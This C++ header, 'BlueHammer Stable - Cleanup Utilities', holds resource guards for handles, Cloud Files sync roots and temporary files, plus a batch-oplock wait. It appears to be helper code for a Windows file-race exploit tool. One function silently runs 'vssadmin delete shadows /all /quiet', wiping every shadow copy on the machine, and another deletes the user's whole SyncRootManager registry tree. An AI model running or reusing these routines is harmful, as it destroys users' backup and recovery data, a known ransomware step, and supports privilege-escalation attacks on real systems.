#pragma once

#include <Windows.h>
#include <cfapi.h>
#include <string>

// ============================================================================
// BlueHammer Stable - Cleanup Utilities
// RAII-style cleanup to prevent resource leaks and folder locking
// ============================================================================

// =============================================================================
// HANDLE GUARD - Auto-close handles
// =============================================================================
class HandleGuard {
private:
    HANDLE m_handle;
public:
    HandleGuard() : m_handle(NULL) {}
    HandleGuard(HANDLE h) : m_handle(h) {}
    ~HandleGuard() { 
        if (m_handle && m_handle != INVALID_HANDLE_VALUE) {
            CloseHandle(m_handle); 
        }
    }
    
    HANDLE* operator&() { return &m_handle; }
    operator HANDLE() { return m_handle; }
    HANDLE get() { return m_handle; }
    void set(HANDLE h) { m_handle = h; }
    HANDLE release() { 
        HANDLE h = m_handle; 
        m_handle = NULL; 
        return h; 
    }
    bool valid() { return m_handle && m_handle != INVALID_HANDLE_VALUE; }
};

// =============================================================================
// SYNC ROOT GUARD - Auto-unregister Cloud Files sync root
// =============================================================================
class SyncRootGuard {
private:
    CF_CONNECTION_KEY m_key;
    wchar_t m_path[MAX_PATH];
    bool m_connected;
    bool m_registered;
    
public:
    SyncRootGuard() : m_connected(false), m_registered(false) {
        ZeroMemory(&m_key, sizeof(m_key));
        ZeroMemory(m_path, sizeof(m_path));
    }
    
    ~SyncRootGuard() {
        cleanup();
    }
    
    void cleanup() {
        if (m_connected) {
            CfDisconnectSyncRoot(m_key);
            m_connected = false;
        }
        if (m_registered) {
            CfUnregisterSyncRoot(m_path);
            m_registered = false;
        }
    }
    
    void setRegistered(const wchar_t* path) {
        wcscpy_s(m_path, MAX_PATH, path);
        m_registered = true;
    }
    
    void setConnected(CF_CONNECTION_KEY key) {
        m_key = key;
        m_connected = true;
    }
    
    CF_CONNECTION_KEY* keyPtr() { return &m_key; }
    wchar_t* pathPtr() { return m_path; }
};

// =============================================================================
// DIRECTORY GUARD - Auto-delete temporary directory
// =============================================================================
class DirectoryGuard {
private:
    wchar_t m_path[MAX_PATH];
    bool m_created;
    
public:
    DirectoryGuard() : m_created(false) {
        ZeroMemory(m_path, sizeof(m_path));
    }
    
    ~DirectoryGuard() {
        cleanup();
    }
    
    bool create(const wchar_t* path) {
        wcscpy_s(m_path, MAX_PATH, path);
        if (CreateDirectoryW(path, NULL)) {
            m_created = true;
            return true;
        }
        return GetLastError() == ERROR_ALREADY_EXISTS;
    }
    
    void cleanup() {
        if (m_created && m_path[0]) {
            // Delete all files in directory first
            wchar_t searchPath[MAX_PATH];
            wcscpy_s(searchPath, MAX_PATH, m_path);
            wcscat_s(searchPath, MAX_PATH, L"\\*");
            
            WIN32_FIND_DATAW fd;
            HANDLE hFind = FindFirstFileW(searchPath, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
                        wchar_t filePath[MAX_PATH];
                        wcscpy_s(filePath, MAX_PATH, m_path);
                        wcscat_s(filePath, MAX_PATH, L"\\");
                        wcscat_s(filePath, MAX_PATH, fd.cFileName);
                        DeleteFileW(filePath);
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            
            RemoveDirectoryW(m_path);
            m_created = false;
        }
    }
    
    const wchar_t* path() { return m_path; }
    void release() { m_created = false; }
};

// =============================================================================
// FILE GUARD - Auto-delete temporary file
// =============================================================================
class FileGuard {
private:
    wchar_t m_path[MAX_PATH];
    bool m_created;
    
public:
    FileGuard() : m_created(false) {
        ZeroMemory(m_path, sizeof(m_path));
    }
    
    ~FileGuard() {
        cleanup();
    }
    
    void set(const wchar_t* path) {
        wcscpy_s(m_path, MAX_PATH, path);
        m_created = true;
    }
    
    void cleanup() {
        if (m_created && m_path[0]) {
            DeleteFileW(m_path);
            m_created = false;
        }
    }
    
    const wchar_t* path() { return m_path; }
    void release() { m_created = false; }
};

// =============================================================================
// VSS CLEANUP - Delete shadow copies
// =============================================================================
inline bool DeleteAllShadowCopies() {
    // Use vssadmin via CreateProcess
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    wchar_t cmd[] = L"vssadmin.exe delete shadows /all /quiet";
    
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

// =============================================================================
// REGISTRY CLEANUP - Clear sync root registrations
// =============================================================================
inline bool ClearSyncRootRegistrations() {
    // Clear HKCU sync roots
    RegDeleteTreeW(HKEY_CURRENT_USER, 
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SyncRootManager");
    return true;
}

// =============================================================================
// PATH VALIDATION
// =============================================================================
inline bool ValidateExecutionPath(wchar_t* blockedReason, size_t reasonSize) {
    wchar_t exePath[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    // Convert to uppercase for comparison
    _wcsupr_s(exePath, MAX_PATH);
    
    if (wcsstr(exePath, L"\\WINDOWS\\TASKS")) {
        wcscpy_s(blockedReason, reasonSize, L"C:\\Windows\\Tasks is a system directory");
        return false;
    }
    if (wcsstr(exePath, L"\\WINDOWS\\SYSTEM32")) {
        wcscpy_s(blockedReason, reasonSize, L"C:\\Windows\\System32 is a system directory");
        return false;
    }
    if (wcsstr(exePath, L"\\WINDOWS\\SYSWOW64")) {
        wcscpy_s(blockedReason, reasonSize, L"C:\\Windows\\SysWOW64 is a system directory");
        return false;
    }
    if (wcsstr(exePath, L"\\WINDOWS\\TEMP")) {
        wcscpy_s(blockedReason, reasonSize, L"C:\\Windows\\Temp is a system directory");
        return false;
    }
    
    return true;
}

// =============================================================================
// OPLOCK WITH TIMEOUT
// =============================================================================
inline DWORD WaitForOplockWithTimeout(HANDLE hFile, DWORD timeoutMs) {
    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ovd.hEvent) return ERROR_CREATE_FAILED;
    
    // Request batch oplock
    DeviceIoControl(hFile, FSCTL_REQUEST_BATCH_OPLOCK, 
        NULL, 0, NULL, 0, NULL, &ovd);
    
    if (GetLastError() != ERROR_IO_PENDING) {
        CloseHandle(ovd.hEvent);
        return GetLastError();
    }
    
    // Wait with timeout
    DWORD waitResult = WaitForSingleObject(ovd.hEvent, timeoutMs);
    CloseHandle(ovd.hEvent);
    
    if (waitResult == WAIT_TIMEOUT) {
        CancelIo(hFile);
        return WAIT_TIMEOUT;
    }
    
    return ERROR_SUCCESS;
}
